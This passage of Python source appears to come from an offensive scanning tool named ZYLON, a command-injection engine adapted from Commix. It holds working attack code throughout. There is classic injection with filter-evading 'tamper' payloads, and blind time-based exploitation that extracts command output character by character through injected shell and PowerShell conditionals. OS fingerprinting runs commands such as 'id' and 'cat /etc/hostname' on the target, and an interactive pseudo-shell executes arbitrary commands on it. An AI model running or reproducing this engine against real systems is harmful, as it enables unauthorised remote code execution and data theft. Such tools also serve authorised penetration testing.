        for technique in tamper_techniques:
            tampered_payload = TamperEngine.apply_tamper(payload, technique)

            resp = self._send_injection(
                url, param, tampered_payload,
                method=method, data=data,
                injection_point=injection_point,
            )

            if resp and resp.status_code == 200:
                output = self._extract_marker_output(resp, marker)
                if output:
                    result["success"] = True
                    result["output"] = output
                    result["payload"] = tampered_payload
                    return result

        # If no marker-based extraction worked, try simpler approach
        # Some contexts don't need markers - direct pipe output
        for sep in [separator, "|"]:
            simple_payload = f"{prefix}{sep}{command}{suffix}"
            resp = self._send_injection(
                url, param, simple_payload,
                method=method, data=data,
                injection_point=injection_point,
            )
            if resp and resp.status_code == 200:
                # Check if response differs from baseline
                baseline_resp = self._send_injection(
                    url, param, "test_benign_value",
                    method=method, data=data,
                    injection_point=injection_point,
                )
                if baseline_resp and len(resp.text) != len(baseline_resp.text):
                    # Extract the difference
                    diff = resp.text.replace(baseline_resp.text, "").strip()
                    if diff:
                        result["success"] = True
                        result["output"] = diff[:2000]  # Limit output length
                        result["payload"] = simple_payload
                        return result

        return result

    def exploit_blind(self, url: str, param: str, command: str,
                       separator: str = ";", prefix: str = "",
                       suffix: str = "", os_type: str = "linux",
                       method: str = "GET", data: dict = None,
                       injection_point: str = "param",
                       delay: int = 3) -> dict:
        """Execute a command via blind (time-based) injection.
        Adapted from Commix's time_related_injection() controller.

        Uses timing analysis to confirm command execution. The technique
        chains the target command with a sleep/ping delay:
          ; COMMAND && sleep N

        If the response takes longer than baseline + delay, the command
        executed successfully.

        For output extraction, this uses Commix's character-by-character
        boolean inference approach (adapted from tb_payloads.get_char()).

        Params:
            url (str): Target URL
            param (str): Vulnerable parameter name
            command (str): OS command to execute
            separator (str): Command separator
            prefix (str): Injection prefix
            suffix (str): Injection suffix
            os_type (str): 'linux' or 'windows'
            method (str): HTTP method
            data (dict): POST data
            injection_point (str): Injection point type
            delay (int): Confirmation delay in seconds

        Returns:
            dict: Exploitation results
        """
        result = {
            "success": False,
            "output": "",
            "payload": "",
            "command": command,
            "executed": False,
        }

        # Measure baseline if not already done
        if self._baseline_time is None:
            self._baseline_time = self._measure_baseline(
                url, param, method=method, data=data,
                injection_point=injection_point,
            )

        baseline = self._baseline_time

        # Step 1: Confirm command execution via timing
        # Payload: ; COMMAND && sleep N
        if os_type == "windows":
            confirm_cmd = f'cmd /c "{command}" && ping -n {delay + 1} 127.0.0.1'
        else:
            confirm_cmd = f"{command} && sleep {delay}"

        payload = f"{prefix}{separator}{confirm_cmd}{suffix}"
        result["payload"] = payload

        start_time = time.time()
        self._send_injection(
            url, param, payload,
            method=method, data=data,
            injection_point=injection_point,
        )
        elapsed = time.time() - start_time

        if elapsed >= (baseline + delay - 1):
            result["executed"] = True
            result["success"] = True
            result["output"] = f"[Command executed - confirmed by {elapsed:.2f}s delay]"

            # Step 2: Extract output character by character
            # Using boolean inference (inspired by BlindSQLiDetector pattern)
            extracted = self._blind_extract_output(
                url, param, command, separator, prefix, suffix,
                os_type, method, data, injection_point, delay, baseline,
            )
            if extracted:
                result["output"] = extracted

        return result

    def _blind_extract_output(self, url: str, param: str, command: str,
                               separator: str, prefix: str, suffix: str,
                               os_type: str, method: str, data: dict,
                               injection_point: str, delay: int,
                               baseline: float, max_length: int = 100) -> str:
        """Extract command output character by character using boolean inference.
        Inspired by Commix's get_char() time-based extraction and
        ZYLON's BlindSQLiDetector binary search pattern.

        For each character position:
          1. Assign command output to a shell variable
          2. Extract character at position
          3. Convert to ASCII value
          4. Compare using binary search (if char < N, sleep)
          5. If response delays, the comparison was true

        This is slower but works when no output is visible in responses.

        Params:
            (same as exploit_blind)
            max_length (int): Maximum output length to extract

        Returns:
            str: Extracted command output
        """
        output = []
        var_name = "z" + "".join(random.choices(string.ascii_lowercase, k=4))

        for pos in range(1, max_length + 1):
            found_char = None

            # Binary search for ASCII value
            lo, hi = 32, 126

            while lo < hi:
                mid = (lo + hi) // 2

                if os_type == "linux":
                    # Linux: store output in var, extract char, compare
                    if separator in (";", "%0a"):
                        payload = (
                            f"{prefix}{separator}"
                            f"{var_name}={CMD_SUB_PREFIX}{command}{CMD_SUB_SUFFIX}"
                            f"{separator}"
                            f"if [ $(printf '%d' \"'${{{var_name}:{pos - 1}:1}}\") -lt {mid} ]"
                            f";then sleep {delay}"
                            f";fi"
                            f"{suffix}"
                        )
                    else:
                        payload = (
                            f"{prefix}{separator}"
                            f"{var_name}={CMD_SUB_PREFIX}{command}{CMD_SUB_SUFFIX}"
                            f"{separator}"
                            f"[ $(printf '%d' \"'${{{var_name}:{pos - 1}:1}}\") -lt {mid} ]"
                            f"{separator}"
                            f"sleep {delay}"
                            f"{suffix}"
                        )
                else:
                    # Windows: simpler approach - use powershell
                    payload = (
                        f"{prefix}{separator}"
                        f"powershell -c \"if(([int][char]((cmd /c {command}).trim())"
                        f"[{pos - 1}]) -lt {mid}){{Start-Sleep -s {delay}}}\""
                        f"{suffix}"
                    )

                start_time = time.time()
                self._send_injection(
                    url, param, payload,
                    method=method, data=data,
                    injection_point=injection_point,
                )
                elapsed = time.time() - start_time

                if elapsed >= (baseline + delay - 1):
                    hi = mid  # Character is less than mid
                else:
                    lo = mid + 1  # Character is >= mid

            # Verify end of string (ASCII 0 or timeout = no char)
            if lo < 32 or lo > 126:
                break

            found_char = chr(lo)
            output.append(found_char)

            # Progress indicator
            console.print(f"[cyan]  Char {pos}: {found_char}[/cyan]", end="")

        console.print()  # Newline after progress
        return "".join(output)

    # ========================================================================
    # OS DETECTION
    # ========================================================================

    def detect_os(self, url: str, param: str,
                   separator: str = None, prefix: str = "",
                   suffix: str = "", method: str = "GET",
                   data: dict = None,
                   injection_point: str = "param") -> dict:
        """Detect the target operating system (Linux/Windows).
        Uses platform-specific commands that only succeed on their respective OS.

        Detection techniques (from Commix's OS fingerprinting):
          - Linux: 'uname' (returns kernel info) vs Windows: 'ver' (returns Windows version)
          - Linux: /etc/passwd exists vs Windows: %WINDIR% is set
          - Linux: 'id' works vs Windows: 'whoami' works differently

        If classic detection is available (output in response), it tests
        platform-specific commands directly. If only blind injection is
        available, it uses timing-based OS detection.

        Params:
            url (str): Target URL
            param (str): Vulnerable parameter
            separator (str): Known working separator (auto-detect if None)
            prefix (str): Injection prefix
            suffix (str): Injection suffix
            method (str): HTTP method
            data (dict): POST data
            injection_point (str): Injection point type

        Returns:
            dict: OS detection results with keys:
                - os_type (str): 'linux', 'windows', or 'unknown'
                - confidence (float): Confidence level 0.0-1.0
                - evidence (dict): Supporting evidence
        """
        result = {
            "os_type": "unknown",
            "confidence": 0.0,
            "evidence": {},
        }

        # If we already detected OS during injection, use that
        if self._detected_os:
            result["os_type"] = self._detected_os
            result["confidence"] = 0.7
            result["evidence"]["source"] = "previous_detection"

        console.print("\n[bold cyan][*] OS Detection via Command Injection[/bold cyan]")

        # Determine working separator
        if separator is None:
            separator = ";"  # Default to semicolon

        # Strategy 1: Classic OS detection (if output visible)
        linux_marker = self._generate_marker(6)
        windows_marker = self._generate_marker(6)

        # Test Linux command
        with console.status("[bold cyan]Testing Linux indicators...[/bold cyan]"):
            for linux_cmd in ["uname", "id", "cat /etc/hostname"]:
                marker = self._generate_marker(6)
                payload = self._build_classic_exec_payload(
                    linux_cmd, marker, separator, prefix, suffix, "linux"
                )
                resp = self._send_injection(
                    url, param, payload, method=method, data=data,
                    injection_point=injection_point,
                )
                if resp:
                    output = self._extract_marker_output(resp, marker)
                    if output:
                        linux_evidence = output.strip()
                        # Check for Linux indicators in output
                        linux_indicators = [
                            "linux", "gnu", "ubuntu", "debian", "centos",
                            "redhat", "fedora", "uid=", "gid=", "root",
                            "/bin/", "darwin", "bsd", "sunos",
                        ]
                        for indicator in linux_indicators:
                            if indicator.lower() in linux_evidence.lower():
                                result["os_type"] = "linux"
                                result["confidence"] = 0.9
                                result["evidence"]["linux_command"] = linux_cmd
                                result["evidence"]["linux_output"] = linux_evidence[:200]
                                result["evidence"]["indicator"] = indicator
                                self._detected_os = "linux"

                                console.print(
                                    f"[bold green][+] OS Detected: Linux[/bold green]"
                                )
                                console.print(
                                    f"    Evidence: {linux_cmd} -> "
                                    f"{linux_evidence[:80]}"
                                )
                                return result

        # Test Windows command
        with console.status("[bold cyan]Testing Windows indicators...[/bold cyan]"):
            for win_cmd in ["ver", "echo %OS%", "echo %WINDIR%"]:
                marker = self._generate_marker(6)
                payload = self._build_classic_exec_payload(
                    win_cmd, marker, separator, prefix, suffix, "windows"
                )
                resp = self._send_injection(
                    url, param, payload, method=method, data=data,
                    injection_point=injection_point,
                )
                if resp:
                    output = self._extract_marker_output(resp, marker)
                    if output:
                        win_evidence = output.strip()
                        windows_indicators = [
                            "windows", "microsoft", "win", "cmd.exe",
                            "c:\\", "c:/", "windir", "system32",
                            "[version", "version",
                        ]
                        for indicator in windows_indicators:
                            if indicator.lower() in win_evidence.lower():
                                result["os_type"] = "windows"
                                result["confidence"] = 0.9
                                result["evidence"]["windows_command"] = win_cmd
                                result["evidence"]["windows_output"] = win_evidence[:200]
                                result["evidence"]["indicator"] = indicator
                                self._detected_os = "windows"

                                console.print(
                                    "[bold green][+] OS Detected: Windows[/bold green]"
                                )
                                console.print(
                                    f"    Evidence: {win_cmd} -> "
                                    f"{win_evidence[:80]}"
                                )
                                return result

        # Strategy 2: Blind OS detection (timing-based)
        console.print("[yellow][*] Classic OS detection inconclusive. Trying timing-based...[/yellow]")

        if self._baseline_time is None:
            self._baseline_time = self._measure_baseline(
                url, param, method=method, data=data,
                injection_point=injection_point,
            )

        baseline = self._baseline_time
        delay = max(3, int(baseline) + 3)

        # Test: Linux 'sleep' vs Windows 'ping -n'
        # If 'sleep N' causes a delay, target is likely Linux
        # If 'ping -n N 127.0.0.1' causes a delay, target is likely Windows
        linux_payload = f"{prefix}{separator}sleep {delay}{suffix}"
        win_payload = f"{prefix}{separator}ping -n {delay + 1} 127.0.0.1{suffix}"

        # Test Linux sleep
        start_time = time.time()
        self._send_injection(
            url, param, linux_payload, method=method, data=data,
            injection_point=injection_point,
        )
        linux_elapsed = time.time() - start_time

        # Test Windows ping
        start_time = time.time()
        self._send_injection(
            url, param, win_payload, method=method, data=data,
            injection_point=injection_point,
        )
        win_elapsed = time.time() - start_time

        linux_delayed = linux_elapsed >= (baseline + delay - 1.5)
        win_delayed = win_elapsed >= (baseline + delay - 1.5)

        if linux_delayed and not win_delayed:
            result["os_type"] = "linux"
            result["confidence"] = 0.8
            result["evidence"]["method"] = "timing_linux_sleep"
            self._detected_os = "linux"
        elif win_delayed and not linux_delayed:
            result["os_type"] = "windows"
            result["confidence"] = 0.8
            result["evidence"]["method"] = "timing_windows_ping"
            self._detected_os = "windows"
        elif linux_delayed and win_delayed:
            # Both worked - likely Linux (ping -n also works on some Linux)
            result["os_type"] = "linux"
            result["confidence"] = 0.6
            result["evidence"]["method"] = "both_ambiguous_likely_linux"
            self._detected_os = "linux"

        if result["os_type"] != "unknown":
            console.print(
                f"[bold green][+] OS Detected: {result['os_type'].title()}[/bold green]"
            )
            console.print(
                f"    Confidence: {result['confidence']:.0%}"
            )
            console.print(
                f"    Linux sleep: {linux_elapsed:.2f}s | "
                f"Windows ping: {win_elapsed:.2f}s"
            )
        else:
            console.print("[yellow][-] OS detection inconclusive[/yellow]")

        return result

    # ========================================================================
    # AUTO-SELECT & EXECUTE
    # ========================================================================

    def execute_command(self, url: str, param: str, command: str,
                         technique: str = "auto",
                         separator: str = None, prefix: str = "",
                         suffix: str = "", os_type: str = None,
                         method: str = "GET", data: dict = None,
                         injection_point: str = "param") -> dict:
        """Execute an OS command using the best available injection technique.
        Auto-selects between classic and blind based on detection results.

        If technique='auto', this method:
          1. Uses previously detected vulnerability info if available
          2. Falls back to running detect() first if no prior detection
          3. Tries classic exploitation first, then blind

        Params:
            url (str): Target URL
            param (str): Vulnerable parameter
            command (str): OS command to execute
            technique (str): 'auto', 'classic', or 'blind'
            separator (str): Command separator (auto-detect if None)
            prefix (str): Injection prefix
            suffix (str): Injection suffix
            os_type (str): Target OS (auto-detect if None)
            method (str): HTTP method
            data (dict): POST data
            injection_point (str): Injection point type

        Returns:
            dict: Command execution results
        """
        # Use stored vulnerability info if available
        if self._vuln_info.get("vulnerable"):
            if separator is None:
                separator = self._vuln_info.get("separator", ";")
            if os_type is None:
                os_type = self._vuln_info.get("os_type", "linux")
            if not prefix:
                prefix = self._vuln_info.get("prefix", "")
            if not suffix:
                suffix = self._vuln_info.get("suffix", "")
            inj_point = self._vuln_info.get("injection_point", {})
            if not data and inj_point.get("data"):
                data = inj_point.get("data")
            if method == "GET" and inj_point.get("method"):
                method = inj_point.get("method")
            if injection_point == "param" and inj_point.get("injection_point"):
                injection_point = inj_point.get("injection_point")

            # Override technique with detected one if auto
            if technique == "auto":
                technique = self._vuln_info.get("technique", "classic")
        else:
            # Need to detect first
            if technique == "auto" or separator is None:
                console.print("[yellow][*] No prior detection. Running detect()...[/yellow]")
                detect_result = self.detect(url, param, method=method, data=data)
                if not detect_result.get("vulnerable"):
                    return {
                        "success": False,
                        "output": "",
                        "error": "No command injection vulnerability detected",
                        "command": command,
                    }
                separator = detect_result.get("separator", ";")
                prefix = detect_result.get("prefix", "")
                suffix = detect_result.get("suffix", "")
                os_type = detect_result.get("os_type", "linux")
                technique = detect_result.get("technique", "classic")

        # Default values
        separator = separator or ";"
        os_type = os_type or "linux"

        # Execute with selected technique
        console.print(
            f"\n[bold cyan][*] Executing: {command}[/bold cyan] "
            f"(technique: {technique}, OS: {os_type})"
        )

        if technique == "classic":
            return self.exploit_classic(
                url, param, command, separator, prefix, suffix,
                os_type, method, data, injection_point,
            )
        elif technique == "blind":
            return self.exploit_blind(
                url, param, command, separator, prefix, suffix,
                os_type, method, data, injection_point,
            )
        else:
            # Try classic first, fall back to blind
            result = self.exploit_classic(
                url, param, command, separator, prefix, suffix,
                os_type, method, data, injection_point,
            )
            if result.get("success"):
                return result

            console.print("[yellow][*] Classic execution failed. Trying blind...[/yellow]")
            return self.exploit_blind(
                url, param, command, separator, prefix, suffix,
                os_type, method, data, injection_point,
            )

    # ========================================================================
    # INTERACTIVE PSEUDO-SHELL
    # ========================================================================

    def get_shell(self, url: str, param: str,
                   separator: str = None, prefix: str = "",
                   suffix: str = "", os_type: str = None,
                   method: str = "GET", data: dict = None,
                   injection_point: str = "param") -> None:
        """Launch an interactive pseudo-shell for persistent command execution.
        Adapted from Commix's os_shell interactive mode.

        Provides a shell-like interface where the user can type commands
        that get executed on the target via command injection.

        Special commands:
          - 'exit' / 'quit': Exit the shell
          - 'os': Display detected OS information
          - 'technique': Display current injection technique
          - 'help': Show available commands
          - 'tamper <technique>': Apply a tamper technique to subsequent payloads

        Params:
            url (str): Target URL
            param (str): Vulnerable parameter
            separator (str): Command separator
            prefix (str): Injection prefix
            suffix (str): Injection suffix
            os_type (str): Target OS
            method (str): HTTP method
            data (dict): POST data
            injection_point (str): Injection point type
        """
        # Ensure we have vulnerability info
        if not self._vuln_info.get("vulnerable"):
            console.print("[yellow][*] No prior detection. Running detect()...[/yellow]")
            detect_result = self.detect(url, param, method=method, data=data)
            if not detect_result.get("vulnerable"):
                console.print("[bold red][!] No vulnerability found. Cannot spawn shell.[/bold red]")
                return

        # Use detected values
        separator = separator or self._vuln_info.get("separator", ";")
        prefix = prefix or self._vuln_info.get("prefix", "")
        suffix = suffix or self._vuln_info.get("suffix", "")
        os_type = os_type or self._vuln_info.get("os_type", "linux")
        technique = self._vuln_info.get("technique", "classic")
        if not data and self._vuln_info.get("injection_point", {}).get("data"):
            data = self._vuln_info["injection_point"]["data"]
        if method == "GET" and self._vuln_info.get("injection_point", {}).get("method"):
            method = self._vuln_info["injection_point"]["method"]
        if injection_point == "param" and self._vuln_info.get("injection_point", {}).get("injection_point"):
            injection_point = self._vuln_info["injection_point"]["injection_point"]

        current_tamper = "none"

        # Shell banner
        shell_prompt = (
            f"[bold green]zylon-shell[/bold green]"
            f"@[bold cyan]{os_type}[/bold cyan]"
            f"({separator})"
        )

        console.print(f"\n[bold green]╔══════════════════════════════════════════════╗[/bold green]")
        console.print(f"[bold green]║  ZYLON Commix Fusion - Interactive Shell     ║[/bold green]")
        console.print(f"[bold green]╚══════════════════════════════════════════════╝[/bold green]")
        console.print(f"  Target: {url}")
        console.print(f"  Parameter: {param} ({injection_point})")
        console.print(f"  OS: {os_type} | Technique: {technique} | Separator: {separator}")
        console.print(f"  Type 'help' for commands, 'exit' to quit\n")

        while True:
            try:
                cmd = input(f"zylon-shell@{os_type}({separator})> ").strip()

                if not cmd:
                    continue

                if cmd.lower() in ("exit", "quit", "q"):
                    console.print("[yellow][*] Exiting shell...[/yellow]")
                    break

                elif cmd.lower() == "help":
                    console.print("[bold cyan]Shell Commands:[/bold cyan]")
                    console.print("  exit/quit    - Exit the shell")
                    console.print("  os           - Show detected OS info")
                    console.print("  technique    - Show current injection technique")
                    console.print("  info         - Show full vulnerability info")
                    console.print("  tamper NAME  - Set tamper technique (none, space2ifs, randomcase, etc.)")
                    console.print("  separator S  - Change separator (;  |  &  &&  ||  %0a)")
                    console.print("  <command>    - Execute OS command on target")
                    continue

                elif cmd.lower() == "os":
                    console.print(f"  Detected OS: [bold cyan]{os_type}[/bold cyan]")
                    if self._detected_os:
                        console.print(f"  Confidence: {self._vuln_info.get('os_type') == self._detected_os}")
                    continue

                elif cmd.lower() == "technique":
                    console.print(f"  Current technique: [bold cyan]{technique}[/bold cyan]")
                    console.print(f"  Tamper: [bold cyan]{current_tamper}[/bold cyan]")
                    continue

                elif cmd.lower() == "info":
                    info_table = Table(
                        title="Vulnerability Info",
                        box=box.ROUNDED,
                        border_style="bright_cyan",
                    )
                    info_table.add_column("Property", style="yellow")
                    info_table.add_column("Value", style="green")
                    info_table.add_row("URL", url)
                    info_table.add_row("Parameter", param)
                    info_table.add_row("Injection Point", injection_point)
                    info_table.add_row("Technique", technique)
                    info_table.add_row("Separator", separator)
                    info_table.add_row("Prefix", prefix or "(none)")
                    info_table.add_row("Suffix", suffix or "(none)")
                    info_table.add_row("OS", os_type)
                    info_table.add_row("Tamper", current_tamper)
                    console.print(info_table)
                    continue

                elif cmd.lower().startswith("tamper "):
                    tamper_name = cmd.split(" ", 1)[1].strip()
                    available = [
                        "none", "space2ifs", "space2ifs_alt", "space2tab",
                        "randomcase", "comment_insert", "url_encode",
                        "double_encode", "base64_encode", "backtick",
                        "dollar_atsigns", "caret",
                    ]
                    if tamper_name in available:
                        current_tamper = tamper_name
                        console.print(f"  Tamper set to: [green]{tamper_name}[/green]")
                    else:
                        console.print(f"  [red]Unknown tamper: {tamper_name}[/red]")
                        console.print(f"  Available: {', '.join(available)}")
                    continue

                elif cmd.lower().startswith("separator "):
                    new_sep = cmd.split(" ", 1)[1].strip()
                    separator = new_sep
                    console.print(f"  Separator set to: [green]{new_sep}[/green]")
                    continue

                # Execute command
                with console.status(f"[bold cyan]Executing: {cmd}...[/bold cyan]"):
                    result = self.execute_command(
                        url, param, cmd,
                        technique=technique,
                        separator=separator,
                        prefix=prefix,
                        suffix=suffix,
                        os_type=os_type,
                        method=method,
                        data=data,
                        injection_point=injection_point,
                    )

                if result.get("success"):
                    output = result.get("output", "")
                    if output:
                        console.print(f"[green]{output}[/green]")
                    else:
                        console.print("[yellow](no output)[/yellow]")
                else:
                    error = result.get("error", "Execution failed")
                    console.print(f"[red][!] {error}[/red]")

            except KeyboardInterrupt:
                console.print("\n[yellow][*] Ctrl+C caught. Type 'exit' to quit.[/yellow]")
            except EOFError:
                console.print("\n[yellow][*] EOF. Exiting shell...[/yellow]")
                break
            except Exception as e:
                console.print(f"[red][!] Error: {e}[/red]")

    # ========================================================================
    # ZYLON SCAN INTEGRATION METHODS
    # ========================================================================

    def scan_detect(self, url: str, param: str = None) -> dict:
        """ZYLON Scan 61: Command Injection Detector.
        Comprehensive detection of command injection vulnerabilities.

        Runs full detection across all injection points, separators,
        and techniques. Returns structured results for ZYLON reporting.

        Params:
            url (str): Target URL
            param (str): Specific parameter to test (None = auto-detect)

        Returns:
            dict: Scan results compatible with ZYLON's report format
        """
        console.print(
            "\n[bold magenta]═══ ZYLON Scan 61: Command Injection Detector ═══[/bold magenta]"
        )

        result = self.detect(url, param)

        # Format results for ZYLON
        scan_result = {
            "scan_type": 61,
            "scan_name": "Command Injection Detector",
            "target": url,
            "vulnerable": result.get("vulnerable", False),
            "technique": result.get("technique"),
            "findings": [],
        }

        if result.get("vulnerable"):
            inj = result.get("injection_point", {})
            finding = {
                "parameter": inj.get("param", "unknown"),
                "injection_point": inj.get("injection_point", "param"),
                "technique": result.get("technique"),
                "separator": result.get("separator"),
                "prefix": result.get("prefix", ""),
                "suffix": result.get("suffix", ""),
                "os_type": result.get("os_type"),
                "payload": result.get("payload", ""),
            }
            scan_result["findings"].append(finding)

            # Display results table
            v_table = Table(
                title="[bold red]Command Injection Vulnerability Found![/bold red]",
                box=box.HEAVY,
                border_style="bold red",
            )
            v_table.add_column("Property", style="yellow")
            v_table.add_column("Value", style="green")
            v_table.add_row("Parameter", finding["parameter"])
            v_table.add_row("Injection Point", finding["injection_point"])
            v_table.add_row("Technique", finding["technique"])
            v_table.add_row("Separator", finding["separator"])
            v_table.add_row("OS", finding["os_type"] or "unknown")
            v_table.add_row("Payload", finding["payload"][:80] + "..." if len(finding["payload"]) > 80 else finding["payload"])
            console.print(v_table)
        else:
            console.print(
                "[bold green][+] No command injection vulnerabilities detected[/bold green]"
            )

        return scan_result

    def scan_detect_os(self, url: str, param: str = None) -> dict:
        """ZYLON Scan 62: Command Injection + OS Detection.
        Detects command injection and identifies the target operating system.

        First runs detection (Scan 61), then performs OS fingerprinting
        using platform-specific commands and timing analysis.

        Params:
            url (str): Target URL
            param (str): Parameter to test

        Returns:
            dict: Scan results with OS detection info
        """
        console.print(
            "\n[bold magenta]═══ ZYLON Scan 62: Command Injection + OS Detection ═══[/bold magenta]"
        )

        # Step 1: Detect vulnerability
        detect_result = self.detect(url, param)

        scan_result = {
            "scan_type": 62,
            "scan_name": "Command Injection + OS Detection",
            "target": url,
            "vulnerable": detect_result.get("vulnerable", False),
            "os_type": "unknown",
            "os_confidence": 0.0,
            "findings": [],
        }

        if not detect_result.get("vulnerable"):
            console.print(
                "[bold yellow][-] No vulnerability detected. Cannot perform OS detection.[/bold yellow]"
            )
            return scan_result

        # Step 2: Detect OS
        inj = detect_result.get("injection_point", {})
        os_result = self.detect_os(
            url,
            inj.get("param", param or "q"),
            separator=detect_result.get("separator"),
            prefix=detect_result.get("prefix", ""),
            suffix=detect_result.get("suffix", ""),
            method=inj.get("method", "GET"),
            data=inj.get("data"),
            injection_point=inj.get("injection_point", "param"),
        )

        scan_result["os_type"] = os_result.get("os_type", "unknown")
        scan_result["os_confidence"] = os_result.get("confidence", 0.0)
        scan_result["findings"] = [{
            "parameter": inj.get("param", "unknown"),
            "technique": detect_result.get("technique"),
            "os_type": os_result.get("os_type", "unknown"),
            "os_confidence": os_result.get("confidence", 0.0),
            "os_evidence": os_result.get("evidence", {}),
        }]

        # Display combined results
        combined_table = Table(
            title="[bold red]Command Injection + OS Detection Results[/bold red]",
            box=box.HEAVY,
            border_style="bold magenta",
        )
        combined_table.add_column("Property", style="yellow")
        combined_table.add_column("Value", style="green")
        combined_table.add_row("Vulnerable", "Yes")
        combined_table.add_row("Technique", detect_result.get("technique", "unknown"))
        combined_table.add_row(
            "Parameter",
            f"{inj.get('param', 'unknown')} ({inj.get('injection_point', 'param')})",
        )
        combined_table.add_row("Separator", detect_result.get("separator", ""))
        combined_table.add_row("OS", os_result.get("os_type", "unknown"))
        combined_table.add_row(
            "OS Confidence",
            f"{os_result.get('confidence', 0.0):.0%}",
        )
        evidence = os_result.get("evidence", {})
        if evidence.get("linux_output"):
            combined_table.add_row("Linux Evidence", evidence["linux_output"][:80])
        if evidence.get("windows_output"):
            combined_table.add_row("Windows Evidence", evidence["windows_output"][:80])
        console.print(combined_table)

        return scan_result

    def scan_shell(self, url: str, param: str = None) -> None:
        """ZYLON Scan 63: Command Injection Shell (Interactive).
        Detects command injection and spawns an interactive pseudo-shell.

        This is the most advanced scan type - it combines detection,
        OS fingerprinting, and interactive command execution into a
        seamless workflow.

        Params:
            url (str): Target URL
            param (str): Parameter to test
        """
        console.print(
            "\n[bold magenta]═══ ZYLON Scan 63: Command Injection Shell ═══[/bold magenta]"
        )

        # Step 1: Detect vulnerability
        detect_result = self.detect(url, param)

        if not detect_result.get("vulnerable"):
            console.print(
                "[bold red][!] No command injection vulnerability found. "
                "Cannot spawn shell.[/bold red]"
            )
            return

        # Step 2: Detect OS
        inj = detect_result.get("injection_point", {})
        os_result = self.detect_os(
            url,
            inj.get("param", param or "q"),
            separator=detect_result.get("separator"),
            prefix=detect_result.get("prefix", ""),
            suffix=detect_result.get("suffix", ""),
            method=inj.get("method", "GET"),
            data=inj.get("data"),
            injection_point=inj.get("injection_point", "param"),
        )

        # Step 3: Spawn shell
        self.get_shell(
            url,
            inj.get("param", param or "q"),
            separator=detect_result.get("separator"),
            prefix=detect_result.get("prefix", ""),
            suffix=detect_result.get("suffix", ""),
            os_type=os_result.get("os_type", "linux"),
            method=inj.get("method", "GET"),
            data=inj.get("data"),
            injection_point=inj.get("injection_point", "param"),
        )


# ============================================================================
# ZYLON INTEGRATION HELPER
# ============================================================================

def register_scan_types():
    """Return scan type definitions for ZYLON's scan_map integration.

    Returns:
        list: Scan type definitions with id, name, and description
    """
    return [
        {
            "id": "61",
            "name": "Command Injection Detector",
            "description": "Detect command injection vulnerabilities (boolean + time-based)",
            "class": "CommandInjectionEngine",
            "method": "scan_detect",
        },
        {
            "id": "62",
            "name": "Command Injection + OS Detection",
            "description": "Detect command injection and identify target OS",
            "class": "CommandInjectionEngine",
            "method": "scan_detect_os",
        },
        {
            "id": "63",
            "name": "Command Injection Shell (Interactive)",
            "description": "Detect command injection and spawn interactive pseudo-shell",
            "class": "CommandInjectionEngine",
            "method": "scan_shell",
        },
    ]
